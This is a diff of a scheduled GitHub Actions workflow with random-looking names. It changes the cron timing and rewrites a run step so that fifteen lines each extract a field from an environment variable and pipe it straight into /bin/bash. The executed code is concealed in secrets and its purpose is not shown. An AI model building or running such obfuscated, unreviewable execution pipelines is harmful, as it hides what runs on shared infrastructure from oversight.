@@ -1,8 +1,9 @@
 name: wuhaoning3214
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 4/6 * * *'
+    - cron: '18 3/6 * * *'
 
 jobs:
   build:
@@ -11,16 +12,21 @@ jobs:
       - uses: actions/checkout@v4
       - name: wuhaoning3214
         env:
-          rhk1905: ${{ secrets.rhk1905 }}
+          os8: ${{ secrets.os8 }}
         run: |
-          echo $rhk1905 | jq -r .qrh00 | /bin/bash
-          echo $hw6 | jq -r .wxt12 | /bin/bash
-          echo $gqt930 | jq -r .qtrr970 | /bin/bash
-          echo $n44 | jq -r .tqak2453 | /bin/bash
-          echo $ikdxm5 | jq -r .li05511 | /bin/bash
-          echo $k834 | jq -r .jebvf45591 | /bin/bash
-          echo $lh790 | jq -r .zlvg0 | /bin/bash
-          echo $if16870 | jq -r .wif43 | /bin/bash
-          echo $bits1 | jq -r .hluv02 | /bin/bash
-          echo $oybh0 | jq -r .mrvhb03 | /bin/bash
+          echo $os8 | jq -r .qj96 | /bin/bash
+          echo $fk38 | jq -r .c42087 | /bin/bash
+          echo $ogjd922 | jq -r .gttk028 | /bin/bash
+          echo $mabnk62817 | jq -r .t13 | /bin/bash
+          echo $zend82143 | jq -r .lqhm06898 | /bin/bash
+          echo $oml9736 | jq -r .xxv95592 | /bin/bash
+          echo $xiswd15 | jq -r .glyhb4 | /bin/bash
+          echo $be44 | jq -r .kky2891 | /bin/bash
+          echo $l2 | jq -r .gec23584 | /bin/bash
+          echo $nnzq32926 | jq -r .ed1704 | /bin/bash
+          echo $fbcx895 | jq -r .oi2 | /bin/bash
+          echo $k41 | jq -r .r742 | /bin/bash
+          echo $khv2 | jq -r .q79 | /bin/bash
+          echo $j515 | jq -r .unc96768 | /bin/bash
+          echo $gxfzw6960 | jq -r .gbfb4 | /bin/bash
 
